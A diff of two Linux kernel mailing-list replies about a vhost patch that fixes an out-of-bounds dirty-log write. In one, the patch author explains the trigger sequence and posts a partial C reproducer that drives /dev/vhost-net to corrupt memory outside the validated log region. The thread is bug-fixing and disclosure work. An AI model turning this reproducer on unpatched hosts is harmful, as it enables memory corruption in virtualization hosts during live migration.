@@ -1,87 +1,60 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=170.10.129.124
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=185.70.43.100
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1795436845;
-	b=GHuQNKtGOCI1RYr9MxtvuGqMJ1hvStTOIF4bH0M3IZoTEWRcjxlUJ5x1Hc48m/Gyptlc
-	 3B0L2VIi03YThNlwcGwahkOn8gy70BUTXEk27AsENT7VWYSShHV8XCWRpYHmX6iqatWTI
-	 79Q1L2nwFpXfjVG3ypP8RE2KAFK2rIzaAIjLfdClWncobZygg07cvTaqDjQZZ1oUHvF7h
-	 W+wLy5gZU7fpT4aEeLYYJmz/MJjz7MnSLcLoGzPkeC3cfflcqOjGj6tbbJXZehjg0Bfm3
-	 WOHekbRgL+vWIFLz47lCPQQHXoNTIENgniyCChMDivgMLxcBfNzTSyHVrXyzEeoZg4g==
+	t=1795437098;
+	b=O6Fx73mXtBZIrW1mupTdCxNU2e9tQf7RKT//Nw6kQqdnHtpc/ouWpEt8rsj0S8KLREqJ
+	 o2D6b8rz+vJYb4QIuZlrWRjctpUqh2vATcdP/FPK6nXxJTO2VxC/zzYOlNzqQFrJ5dJA6
+	 6m9C1mUk1/OuyFaPWvtohkKzi01UAec7mf9WHBd3FCKcCdCp5khgOMLJSafKdNnG17fQO
+	 2DBewYMAQ78lthPeVPUETuD7HDkEYkv1etPfXBWZS+TOhu1le47cNeICcysnWmznojKym
+	 A4hwSMcF5Miuz4pTU5vOrK1AvtLYoea7Vs4iCtSqdYeMmwJhb223Q9a4eGhLgaE3C4g==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1795436845;
-	h=DMARC-Filter:DKIM-Signature:Received:X-MC-Unique:
-	 X-Mimecast-MFC-AGG-ID:Received:X-Google-DKIM-Signature:
-	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
-	 X-Received:MIME-Version:References:In-Reply-To:From:Date:
-	 X-Gm-Features:Message-ID:Subject:To:Cc:X-Mimecast-Spam-Score:
-	 X-Mimecast-MFC-PROC-ID:X-Mimecast-Originator:Content-Type:
-	 Content-Transfer-Encoding;
-	bh=YImJ/ALCtekb57+DaL5zQvBLKaVvYqpkrQRdHCmg3Uk=;
-	b=2DXbBxg/+n5IoA1rrIz1z8eXrfmE71XJeKAxtJsd4B+pJ75O+1fYw+TlWDdBfoT1fE3G
-	 rI/AsjSvVw43p8xPF1AsYY2PIAAr01n3eOsRzGmLodLigCrovWhmwLz8klAqDlHE8FitP
-	 M8kFsK4F7PFHEJN6zv1ZILQBlasmMcs1ypVyKa0RVgW2lCwn6m5K360sDUTEFrBxnFsPG
-	 8SiYS6UsPL+Uvaa8t7o+TEAiO5jL5yVdHayXKLcsHwXzvMEJZDlJJEl0y4mYqYADX4sG6
-	 ls2Q/ErhjIWg8wYOVY8VmRo5CDkjQKEbBV0FvWrjSfoDVh9+tvftvQKJ8zSWaq1IVLw==
+	a=rsa-sha256; c=relaxed/relaxed; t=1795437098;
+	h=DMARC-Filter:DKIM-Signature:Date:To:From:Cc:Subject:Message-ID:
+	 In-Reply-To:References:Feedback-ID:X-Pm-Message-ID:MIME-Version:
+	 Content-Type;
+	bh=L2yPIhyBQV7RPo2ReCzKyh/mpAYLjnCAGbEpJpcII3U=;
+	b=NLwmysjLJcf3dl3jT+yNKLDYeB9faXzETFYCfW28c6CmAkXNHJSiH4nfcDX1sTH/pNnc
+	 6lPt2wAJXNnECpTNruHuDCS0eTUynME2BW1yIoTXY3PkQIdEMMFvNKbpsPO0dHzIaLxmH
+	 xC2U6y/hrEs6RihxQIPHbcx6QN/uc11K/g/YHZbxSRyTZLPLZ1SUDfmnjKPVSLqKMs0ih
+	 Q0EkvUG/C9LCwGZzeNl3yVS4/Aozrk3FAT6VVTOVpWnxvBN4cwDtEPLSfYJKPJOPd/aQy
+	 Qe3Le3mR9yff1XE8t4D/GUtNGMfI7P+P3DIiWQzC8CujeyoMS7szI8UahM3gFAF3vbQ==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=redhat.com;
-	spf=pass smtp.mailfrom=redhat.com;
-	dkim=pass header.d=redhat.com header.i=@redhat.com header.a=rsa-sha256 header.s=mimecast20190719 header.b=austTnm7;
-	arc=none smtp.remote-ip=170.10.129.124
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
+	dmarc=pass header.from=pm.me;
+	spf=pass smtp.mailfrom=pm.me;
+	dkim=pass header.d=pm.me header.i=@pm.me header.a=rsa-sha256 header.s=protonmail3 header.b=orGAHYfC;
+	arc=none smtp.remote-ip=185.70.43.100
+Received: from mail-43100.protonmail.ch (mail-43100.protonmail.ch [185.70.43.100])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DBCAE606A31A
-	for <virtualization@lists.linux.dev>; Mon, 23 Nov 2026 12:27:24 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org DBCAE606A31A
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 03C46606A31E
+	for <virtualization@lists.linux.dev>; Mon, 23 Nov 2026 12:31:37 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 03C46606A31E
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=pm.me
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=pm.me
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.a=rsa-sha256 header.s=mimecast20190719 header.b=austTnm7
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1795436844;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=YImJ/ALCtekb57+DaL5zQvBLKaVvYqpkrQRdHCmg3Uk=;
-	b=austTnm7GrXvKGBWWbH7EvCQRT/3bOSu4hhfoJ8Pnc9yCya1+YU0j6JMjuXyAder4h2uOh
-	szhZaW/9DV8y1eI0olivAEHPnDLG/tWAgMr297bwBRx1kGOtt5MPFKxZ6wxPF6wjnKPm3W
-	8v4G2N2GgOXhQ5LVO0ChNlIe4AvLjuI=
-Received: from mail-yx1-f70.google.com (mail-yx1-f70.google.com
- [74.125.224.70]) by relay.mimecast.com with ESMTP with STARTTLS
- (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
- us-mta-325-3Q57t59APUKCJwZWhc7MMQ-1; Mon, 23 Nov 2026 12:27:22 +0000
-X-MC-Unique: 3Q57t59APUKCJwZWhc7MMQ-1
-X-Mimecast-MFC-AGG-ID: 3Q57t59APUKCJwZWhc7MMQ_1795436841
-Received: by mail-yx1-f70.google.com with SMTP id 956f58d0204a3-67906c453b8so4815469d50.1
-        for <virtualization@lists.linux.dev>; Mon, 23 Nov 2026 04:27:22 -0800 (PST)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1795436841; x=1796041641;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=YImJ/ALCtekb57+DaL5zQvBLKaVvYqpkrQRdHCmg3Uk=;
-        b=bzPSVru5bZaN8swmtaF6hZU55I02yVGZ09ccmWCFn4/3rDqzgQ+DdSksoBbPFxISE6
-         VQmWClWmBh1VSEWBb8hHBDGn57fcXe1DBgXv+gf6llv26M+MhNDPISl44kmi+OfErJJa
-         ELlWVJ/iAOa+voLCA0cKEtPr3r232nzSP5xkvAfo0m1cz6Ce403MsC5oVZJ6lnGeW3of
-         UsliD1ZNqSu7EwxMiHDw2afM5/dmF3kQQL7dVyqazNh72NYzElWK+EtnzWcpPNTdyGp6
-         b+rE+bfGEIE6DGnITfCEr74amlS2qsRHA7thxToOzmVZi7hu9tNYwMoKz1Adu5d/8eFL
-         eIPg==
-X-Forwarded-Encrypted: i=1; AL+hErGYI6Tt+ZQHK9P2iHO9dEEmKtGx6R5nw5devtN4WW3X4bx5qNTWtimgVq9Xnpmq+B29J/biPYQ8DMqsqieA7Q==@lists.linux.dev
-X-Gm-Message-State: APuU4Z9Hx/YN0T8M1VJd+6M0rSUaGhRRW7TI7nHKOZpRzD4lyYcBVAko
-	qeONj28JWsioE2HfNsVof6H4OrB2GRgoQPaVNhaUSSGYzJnW3yG5pkx93TTgfW41JlmWMi1ALyO
-	MrKAz22mo2PHsk7SdXv8IWGhNoCq1reXxsyH4C4ndm/KtUizogVZC/XM9SEY+BEABVLCA2DZWSy
-	0WaksuEEUq+j67/a0oN0a1VMgForGe+oPxExJ41gMeKs8=
-X-Gm-Gg: AZFdTZcQSLDq1dFNu9xacRB91IVTfP84ZLgbprgXZGLzCVbYsGvfcbZ6obMwWE+M0/j
-	vbG32K8ZSydYd4fFHRoCN6Mf+WR/1ALTjh2fupnzW2QLiTZ+MHSB8IEqLquR2njpNAY6aQZZJuW
-	soyrKQT5hY/9A09fWd/RDr+7FCHFa6akv4uCQ7pIw9xJV5EUxzqB3G5OF2ihUGXSMFCXdJtfj2V
-	mHHgVAOSmuNjx3F4qaEHQSoMrHaeJfJolHzvpopFh36pFokaBtavsXsvug=
-X-Received: by 2002:a05:690e:11c5:b0:67d:a3c2:c95 with SMTP id 956f58d0204a3-67dec2bd130mr4963366d50.3.1795436841330;
-        Mon, 23 Nov 2026 04:27:21 -0800 (PST)
-X-Received: by 2002:a05:690e:11c5:b0:67d:a3c2:c95 with SMTP id
- 956f58d0204a3-67dec2bd130mr4963360d50.3.1795436840812; Mon, 23 Nov 2026
- 04:27:20 -0800 (PST)
+	dkim=pass (2048-bit key) header.d=pm.me header.i=@pm.me header.a=rsa-sha256 header.s=protonmail3 header.b=orGAHYfC
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=pm.me;
+	s=protonmail3; t=1795437095; x=1795696295;
+	bh=L2yPIhyBQV7RPo2ReCzKyh/mpAYLjnCAGbEpJpcII3U=;
+	h=Date:To:From:Cc:Subject:Message-ID:In-Reply-To:References:
+	 Feedback-ID:From:To:Cc:Date:Subject:Reply-To:Feedback-ID:
+	 Message-ID:BIMI-Selector;
+	b=orGAHYfCAh/lZAMNLANfqkImnJkAZx7I0N2gPUn2w43PmkCvXmNgS2NxjuYIsmrz0
+	 mzVF5+F9yLgu7pAxg4kOFIlMKMkt6Pg1F/0qu9Kfkhw9yiKci+BN8/KulgDJYBk5Ii
+	 Q7xAd4061oaXr8nu7hDsbqhRe9YSvcQ2E4vJPGxhIVs4g1so9xhGhjqytp5vXpC3QO
+	 mQi4azq0ihr9qSuRJc3VBJBz8pgMXAqDOZTE6f4CijtDLw+RYA/RawTa2FdbCyfzwc
+	 byOjDRU4ptYNlLyAD/63tpSEz8QK5S4JVdRr2urb9XsD3dOyPX+CStsVM5r1mch4tG
+	 Kzk30t+OP8SVg==
+Date: Mon, 23 Nov 2026 12:31:31 +0000
+To: Jiaming Fan <fan.jiaming@hotmail.com>
+From: fadouse <fadouse@pm.me>
+Cc: "Michael S. Tsirkin" <mst@redhat.com>, Jason Wang <jasowangio@gmail.com>, =?utf-8?Q?Eugenio_P=C3=A9rez?= <eperezma@redhat.com>, Linfeng Sun <linfeng.sun.dev@gmail.com>, Fang Xieyan <fangxy@xiaopeng.com>, kvm@vger.kernel.org, virtualization@lists.linux.dev, netdev@vger.kernel.org, linux-kernel@vger.kernel.org, stable@vger.kernel.org
+Subject: Re: [PATCH] vhost: mask the in-order used-ring log cursor
+Message-ID: <UyUECMkza3HsE8hlpqg49_Lm19szdV5Hc9zB7OETazRoRNW-HGoOQBwhufIzmdCbvO8WNSuWqN6mL1cZHGDY_keWvbNqVZI3H9MA1dYzBJM=@pm.me>
+In-Reply-To: <OS3PR01MB10251C7A76A9ED480E3C497FEE7452@OS3PR01MB10251.jpnprd01.prod.outlook.com>
+References: <20261122-b4-06-vhost-in-order-log-oob-v1-35efdba8fbab-v1-1-fc1253d60351@pm.me> <OS3PR01MB10251C7A76A9ED480E3C497FEE7452@OS3PR01MB10251.jpnprd01.prod.outlook.com>
+Feedback-ID: 173252840:user:proton
+X-Pm-Message-ID: 5cf0a3bb38be6b505433c93e8bf104a4c41df515
 X-Mailing-List: virtualization@lists.linux.dev
 List-Id: <virtualization.lists.linux.dev>
 List-Post: <mailto:virtualization@lists.linux.dev>
@@ -91,143 +64,344 @@ List-Unsubscribe: <mailto:virtualization+unsubscribe@lists.linux.dev>
 List-Owner: <mailto:virtualization+owner@lists.linux.dev>
 Precedence: list
 MIME-Version: 1.0
-References: <20261122-b4-06-vhost-in-order-log-oob-v1-35efdba8fbab-v1-1-fc1253d60351@pm.me>
-In-Reply-To: <20261122-b4-06-vhost-in-order-log-oob-v1-35efdba8fbab-v1-1-fc1253d60351@pm.me>
-From: Eugenio Perez Martin <eperezma@redhat.com>
-Date: Mon, 23 Nov 2026 13:26:44 +0100
-X-Gm-Features: Aa3M54pt5PWY45sVKrMEfHYWn7Rl4h8pw_TEQAIUnc03qW3ChT2fpOFP_O-rkHg
-Message-ID: <CAJaqyWdOF3LVF+WHaGw8gimULaCunRkuLnKAhciB7HWpYhnm9w@mail.gmail.com>
-Subject: Re: [PATCH] vhost: mask the in-order used-ring log cursor
-To: fadouse@pm.me
-Cc: "Michael S. Tsirkin" <mst@redhat.com>, Jason Wang <jasowangio@gmail.com>, 
-	Linfeng Sun <linfeng.sun.dev@gmail.com>, Fang Xieyan <fangxy@xiaopeng.com>, kvm@vger.kernel.org, 
-	virtualization@lists.linux.dev, netdev@vger.kernel.org, 
-	linux-kernel@vger.kernel.org, stable@vger.kernel.org
-X-Mimecast-Spam-Score: 0
-X-Mimecast-MFC-PROC-ID: XQnPdPkkzBWMK6s-SCtJ7D5oqqAKUwsnHOWfPIfY4oQ_1795436841
-X-Mimecast-Originator: redhat.com
-Content-Type: text/plain; charset="UTF-8"
+Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha512; boundary="------131195ce22d4e3494741ac7e4a8fcd905c43f07926a9b8163a5d63b446f9ad82"; charset=utf-8
+
+This is an OpenPGP/MIME signed message (RFC 4880 and 3156)
+--------131195ce22d4e3494741ac7e4a8fcd905c43f07926a9b8163a5d63b446f9ad82
+Content-Type: multipart/mixed;boundary=---------------------db2a6f9e247f33a80a9db7509317076d
+
+-----------------------db2a6f9e247f33a80a9db7509317076d
 Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain;charset=utf-8
 
-On Sun, Nov 22, 2026 at 2:20=E2=80=AFPM YanXin Li via B4 Relay
-<devnull+fadouse.pm.me@kernel.org> wrote:
->
-> From: YanXin Li <fadouse@pm.me>
->
-> vhost_add_used_n_in_order() plays the batch of used-ring writes back a
-> second time for dirty logging.  Commit e244725e86be ("vhost: fix used
-> ring index wrap in vhost_add_used_n_in_order") masked the index in the
-> descriptor-publishing loop.  The dirty-logging loop introduced by
-> bfcde6b64769 still uses the single-subtraction form
->
->     next =3D start + nheads[i];
->     if (next >=3D vq->num)
->         next -=3D vq->num;
->
-> If the guest refills the available ring while get_rx_bufs() collects
-> one mergeable-RX packet, that packet can consume more heads than
-> vq->num.
+Hi Jiaming,
 
-Although I'm ok with the proposed patch as hardening or optimization,
-this sounds more like a bug in get_rx_bufs. Where are the memory
-addresses for these pieces stored if there are no more buffers in the
-virtqueue? Or is it able to loop through the vq?
+> The mask looks right to me. What I don't follow is how `nheads[0]`
+> gets to 64 on a 32-entry queue. Those buffers haven't been returned to
+> the driver yet, so what can it put back on the ring? Can this happen
+> with a conforming driver, or does the test guest reuse descriptors
+> that are still in flight?
 
-> get_rx_bufs() permits up to UIO_MAXIOV =3D 1024 descriptor
-> chains in one call, so a single subtraction is not enough.  For
-> vq->num =3D 32, last_used_idx =3D 0 and nheads[0] =3D 64, next becomes
-> 64 - 32 =3D 32, which is still equal to vq->num and out of bounds.  The
-> next iteration then logs
->
->     used =3D vq->used->ring + 32;
->     log_used(vq, 4 + 32 * 8, 8);
->
-> which starts past the end of the 260-byte ring body (4 + 32 * 8).
-> For a used ring placed inside page 7 at guest address 0x7ef8 (so the
-> entire 262-byte ring occupies [0x7ef8, 0x7ffe) and
-> vq_log_used_access_ok() validates only log_base[0]), log_used()
-> marks [0x7ffc, 0x8004) as dirty.  log_write() then sets a bit in
-> log_base[1] for page 8, past the single validated byte.  On a
-> vhost-net RX queue configured with VIRTIO_F_IN_ORDER,
-> VIRTIO_NET_F_MRG_RXBUF,
-> VHOST_F_LOG_ALL, VHOST_VRING_F_LOG, vq->num =3D 32, and
-> log_guest_addr =3D 0x7ef8, delivering one 8 KiB frame consuming 64
-> mergeable buffers followed by one 1-buffer frame in the same
-> count =3D 2 flush writes
->
->     log_base[1] =3D 0x01
->
-> where log_base[0] =3D 0x80 is the only byte the kernel was entitled to
-> touch.  A guest attached to a vhost-net backend with dirty-page
-> logging enabled (for example during live migration) and a small RX
-> ring can therefore corrupt dirty-log bitmap memory that the VMM owns
-> outside the region registered for this ring.
->
-> Wrap the logging loop index the same way the first loop does:
->
->     next =3D (start + nheads[i]) & (vq->num - 1);
->
-> vhost_vring_set_num() already enforces that vq->num is a nonzero
-> power of two, so this is well defined for every accepted ring size.
-> The coalescing invariant is preserved: if a run is not flushed,
-> next =3D=3D start + 1.  When start =3D=3D vq->num - 1, start + 1 =3D=3D v=
-q->num,
-> whereas the masked next is always less than vq->num.  The run is
-> therefore flushed before the cursor wraps.
-> With this change the same vhost-net configuration publishes
-> used->idx =3D 65 and confines the dirty log to log_base[0] =3D 0x80,
-> leaving log_base[1] =3D 0x00.  The mask keeps next in [0, vq->num) for
-> every accepted power-of-two ring size.  As a bounded cross-check of
-> the index arithmetic, a Z3 model over ring sizes {1, 2, 4, 8, 16, 32}
-> and buffer counts in [1, 64] finds an out-of-range result for the old
-> subtraction (vq->num =3D 16, start =3D 15, nheads =3D 17) and none for th=
-e
-> mask within those bounds.
->
-> Runtime verification and fix validation were performed in an x86-64
-> QEMU/KVM guest running mainline after v7.4-rc3, with Generic KASAN,
-> UBSAN, lockdep, and DEBUG_OBJECTS.
->
+It is a non-conforming guest reusing in-flight ring slots; a conforming
+driver would not advance avail->idx past last_used_idx + vq->num.
 
-Can you post the reproducer? Even better if it is integrated in
-tools/virtio/vhost_net_test.c.
+vhost accepts this because vhost_get_avail_idx() checks against
+vq->last_avail_idx rather than vq->last_used_idx:
 
-Thanks!
+  if (unlikely((u16)(avail_idx - vq->last_avail_idx) > vq->num))
 
-> Fixes: bfcde6b64769 ("vhost: fix dirty logging for in-order used ring ent=
-ries")
-> Cc: stable@vger.kernel.org
-> Signed-off-by: YanXin Li <fadouse@pm.me>
-> ---
->  drivers/vhost/vhost.c | 4 +---
->  1 file changed, 1 insertion(+), 3 deletions(-)
->
-> diff --git a/drivers/vhost/vhost.c b/drivers/vhost/vhost.c
-> index dc973287567..80b887e1511 100644
-> --- a/drivers/vhost/vhost.c
-> +++ b/drivers/vhost/vhost.c
-> @@ -3206,9 +3206,7 @@ static int vhost_add_used_n_in_order(struct vhost_v=
-irtqueue *vq,
->                                 log_start =3D start;
->                         log_count++;
->
-> -                       next =3D start + nheads[i];
-> -                       if (next >=3D vq->num)
-> -                               next -=3D vq->num;
-> +                       next =3D (start + nheads[i]) & (vq->num - 1);
->                         if (i + 1 =3D=3D count || next !=3D start + 1) {
->                                 used =3D vq->used->ring + log_start;
->                                 log_used(vq,
->
-> ---
-> base-commit: c44104f3642da720164042623e4832836aefdd8e
-> change-id: 20261122-b4-06-vhost-in-order-log-oob-v1-35efdba8fbab-43734ad1=
-0f0a
->
-> Best regards,
-> --
-> YanXin Li <fadouse@pm.me>
->
->
->
+With vq->num =3D 32 and an 8180-byte frame (+ 12B vnet hdr =3D 64 x 128B
+buffers) followed by a 64-byte frame (1 buffer):
+
+  1. Guest publishes avail->idx =3D 32 and kicks.  get_rx_bufs() runs dry
+     at 32 buffers and calls vhost_discard_vq_desc(), rewinding
+     last_avail_idx to 0 while leaving vq->avail_idx =3D 32 cached.
+  2. Guest advances avail->idx to 64 and kicks again.
+     vhost_get_vq_desc_n() consumes cached 0..31 (last_avail_idx -> 32,
+     last_used_idx still 0), then refreshes avail->idx =3D 64:
+     (u16)(64 - 32) =3D=3D 32 <=3D vq->num passes, so get_rx_bufs() collec=
+ts
+     32..63 into the same frame (nheads[0] =3D 64).
+  3. The test polls buf0[12] (with pages 1..31 dropped via
+     madvise(MADV_DONTNEED) to widen the copy window) and tries to
+     publish avail->idx =3D 65 during the frame-0 copy so handle_rx() can
+     pick up the 1-buffer frame and flush both in a single
+     vhost_add_used_n_in_order() batch (count =3D 2, nheads =3D {64, 1}).
+
+(Minor correction to my commit message: without VIRTIO_RING_F_EVENT_IDX
+the used ring is 260 bytes at [0x7ef8, 0x7ffc) rather than 262 bytes;
+vq_log_used_access_ok() still validates only log_base[0], and the
+unmasked flush logs [0x7ffc, 0x8004) into log_base[1].)
+
+> Could you share the RX test program you used?
+
+Build with `gcc -O2 -Wall -Wextra test_vhost_inorder.c -o test_vhost_inord=
+er`
+and run as root (exit 2 =3D bug reproduced, 0 =3D fixed, 3 =3D timing retr=
+y):
+
+----8<----
+// SPDX-License-Identifier: GPL-2.0
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/if_tun.h>
+#include <linux/vhost.h>
+#include <linux/virtio_config.h>
+#include <linux/virtio_net.h>
+#include <linux/virtio_ring.h>
+#include <net/if.h>
+#include <netpacket/packet.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/eventfd.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#define GUEST_MEM_SIZE	(16UL * 1024 * 1024)
+#define IOVA_DESC	0x0000
+#define IOVA_AVAIL	0x1000
+#define IOVA_USED	0x7ef8
+#define BUF_IOVA_BASE	0x20000
+#define VQ_NUM		32
+#define BUF_LEN		128
+#define FRAME0_LEN	8180	/* + 12B vnet hdr =3D 64 * 128B */
+#define FRAME1_LEN	64
+#define NHEADS0		64
+#define TOTAL_AVAIL	65
+
+typedef uint8_t  u8;
+typedef uint16_t u16;
+typedef uint64_t u64;
+
+static void die(const char *msg)
+{
+	fprintf(stderr, "%s: %s\n", msg, strerror(errno));
+	exit(1);
+}
+
+static void publish_avail(struct vring_avail *avail, u16 v)
+{
+	__atomic_store_n(&avail->idx, v, __ATOMIC_RELEASE);
+}
+
+static void kick(int efd)
+{
+	u64 one =3D 1;
+
+	if (write(efd, &one, sizeof(one)) !=3D sizeof(one))
+		die("kick");
+}
+
+int main(void)
+{
+	int vfd, tfd, pkt, sock, kick_fd, call_fd, ifindex;
+	struct ifreq ifr =3D {};
+	struct vring_desc *desc;
+	struct vring_avail *avail;
+	struct vring_used *used;
+	struct sockaddr_ll sll =3D {};
+	unsigned char frame0[FRAME0_LEN], frame1[FRAME1_LEN];
+	struct {
+		struct vhost_memory m;
+		struct vhost_memory_region r[1];
+	} memtable =3D {
+		.m =3D { .nregions =3D 1 },
+		.r =3D { { .guest_phys_addr =3D 0, .memory_size =3D GUEST_MEM_SIZE } },
+	};
+	struct vhost_vring_state vs =3D {};
+	struct vhost_vring_addr va =3D {};
+	struct vhost_vring_file vf =3D {};
+	u64 features, log_base_ptr;
+	void *guest_mem;
+	unsigned char *log_base;
+	u8 *buf0;
+
+	guest_mem =3D mmap(NULL, GUEST_MEM_SIZE, PROT_READ | PROT_WRITE,
+			 MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+	if (guest_mem =3D=3D MAP_FAILED)
+		die("mmap guest_mem");
+	log_base =3D mmap(NULL, 4096, PROT_READ | PROT_WRITE,
+			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+	if (log_base =3D=3D MAP_FAILED)
+		die("mmap log_base");
+
+	desc  =3D (struct vring_desc *)((u8 *)guest_mem + IOVA_DESC);
+	avail =3D (struct vring_avail *)((u8 *)guest_mem + IOVA_AVAIL);
+	used  =3D (struct vring_used *)((u8 *)guest_mem + IOVA_USED);
+	buf0  =3D (u8 *)guest_mem + BUF_IOVA_BASE;
+
+	for (int i =3D 0; i < VQ_NUM; i++) {
+		desc[i] =3D (struct vring_desc){
+			.addr  =3D BUF_IOVA_BASE + 4096 * i,
+			.len   =3D BUF_LEN,
+			.flags =3D VRING_DESC_F_WRITE,
+		};
+		avail->ring[i] =3D i;
+	}
+	for (int i =3D 1; i < VQ_NUM; i++)
+		madvise((u8 *)guest_mem + BUF_IOVA_BASE + 4096 * i,
+			4096, MADV_DONTNEED);
+
+	tfd =3D open("/dev/net/tun", O_RDWR);
+	if (tfd < 0)
+		die("open /dev/net/tun");
+	ifr.ifr_flags =3D IFF_TAP | IFF_NO_PI | IFF_VNET_HDR;
+	snprintf(ifr.ifr_name, IFNAMSIZ, "vh%d", getpid() % 1000);
+	if (ioctl(tfd, TUNSETIFF, &ifr))
+		die("TUNSETIFF");
+	{
+		int hdr_sz =3D 12;
+
+		if (ioctl(tfd, TUNSETVNETHDRSZ, &hdr_sz))
+			die("TUNSETVNETHDRSZ");
+	}
+	{
+		char path[128];
+		int fd;
+
+		snprintf(path, sizeof(path),
+			 "/proc/sys/net/ipv6/conf/%s/disable_ipv6",
+			 ifr.ifr_name);
+		fd =3D open(path, O_WRONLY);
+		if (fd >=3D 0) {
+			if (write(fd, "1", 1) < 0) {}
+			close(fd);
+		}
+	}
+
+	sock =3D socket(AF_INET, SOCK_DGRAM, 0);
+	if (sock < 0)
+		die("socket");
+	if (ioctl(sock, SIOCGIFFLAGS, &ifr))
+		die("SIOCGIFFLAGS");
+	ifr.ifr_flags |=3D IFF_UP | IFF_RUNNING;
+	if (ioctl(sock, SIOCSIFFLAGS, &ifr))
+		die("SIOCSIFFLAGS");
+	if (ioctl(sock, SIOCGIFINDEX, &ifr))
+		die("SIOCGIFINDEX");
+	ifindex =3D ifr.ifr_ifindex;
+	ifr.ifr_mtu =3D 9000;
+	if (ioctl(sock, SIOCSIFMTU, &ifr))
+		die("SIOCSIFMTU");
+
+	pkt =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+	if (pkt < 0)
+		die("socket packet");
+	sll.sll_family =3D AF_PACKET;
+	sll.sll_protocol =3D htons(ETH_P_ALL);
+	sll.sll_ifindex =3D ifindex;
+	if (bind(pkt, (struct sockaddr *)&sll, sizeof(sll)))
+		die("bind");
+
+	vfd =3D open("/dev/vhost-net", O_RDWR);
+	if (vfd < 0)
+		die("open /dev/vhost-net");
+	if (ioctl(vfd, VHOST_SET_OWNER, 0))
+		die("VHOST_SET_OWNER");
+	memtable.r[0].userspace_addr =3D (u64)guest_mem;
+	if (ioctl(vfd, VHOST_SET_MEM_TABLE, &memtable))
+		die("VHOST_SET_MEM_TABLE");
+	log_base_ptr =3D (u64)log_base;
+	if (ioctl(vfd, VHOST_SET_LOG_BASE, &log_base_ptr))
+		die("VHOST_SET_LOG_BASE");
+
+	features =3D (1ULL << VIRTIO_NET_F_MRG_RXBUF) |
+		   (1ULL << VIRTIO_F_IN_ORDER) |
+		   (1ULL << VHOST_F_LOG_ALL);
+	if (ioctl(vfd, VHOST_SET_FEATURES, &features))
+		die("VHOST_SET_FEATURES");
+
+	kick_fd =3D eventfd(0, 0);
+	call_fd =3D eventfd(0, 0);
+	if (kick_fd < 0 || call_fd < 0)
+		die("eventfd");
+
+	vs.num =3D VQ_NUM;
+	if (ioctl(vfd, VHOST_SET_VRING_NUM, &vs))
+		die("VHOST_SET_VRING_NUM");
+	vs.num =3D 0;
+	if (ioctl(vfd, VHOST_SET_VRING_BASE, &vs))
+		die("VHOST_SET_VRING_BASE");
+
+	va.flags =3D 1U << VHOST_VRING_F_LOG;
+	va.desc_user_addr =3D (u64)desc;
+	va.avail_user_addr =3D (u64)avail;
+	va.used_user_addr =3D (u64)used;
+	va.log_guest_addr =3D IOVA_USED;
+	if (ioctl(vfd, VHOST_SET_VRING_ADDR, &va))
+		die("VHOST_SET_VRING_ADDR");
+
+	vf.fd =3D kick_fd;
+	if (ioctl(vfd, VHOST_SET_VRING_KICK, &vf))
+		die("VHOST_SET_VRING_KICK");
+	vf.fd =3D call_fd;
+	if (ioctl(vfd, VHOST_SET_VRING_CALL, &vf))
+		die("VHOST_SET_VRING_CALL");
+	vf.fd =3D tfd;
+	if (ioctl(vfd, VHOST_NET_SET_BACKEND, &vf))
+		die("VHOST_NET_SET_BACKEND");
+
+	memset(frame0, 0xAB, sizeof(frame0));
+	memset(frame1, 0xCD, sizeof(frame1));
+	frame0[12] =3D frame1[12] =3D 0x08;
+	frame0[13] =3D frame1[13] =3D 0x00;
